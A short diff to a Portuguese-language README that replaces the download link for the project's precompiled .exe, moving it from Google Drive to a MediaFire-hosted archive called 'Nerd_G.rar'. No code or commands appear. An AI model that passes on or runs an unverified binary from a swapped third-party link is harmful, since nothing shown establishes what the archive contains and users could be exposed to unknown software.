@@ -25,7 +25,7 @@
 
 O aplicativo já está compilado em `.exe`. Basta fazer o download no link abaixo:
 
-🔗 [Baixar Executável](https://drive.google.com/file/d/1XRIM4biTAwpJbZBTgwyuTLtM19HC4d58/view)
+🔗 [Baixar Executável](https://www.mediafire.com/file/duejv2d10ldcehh/Nerd_G.rar/file)
 
 ---
 
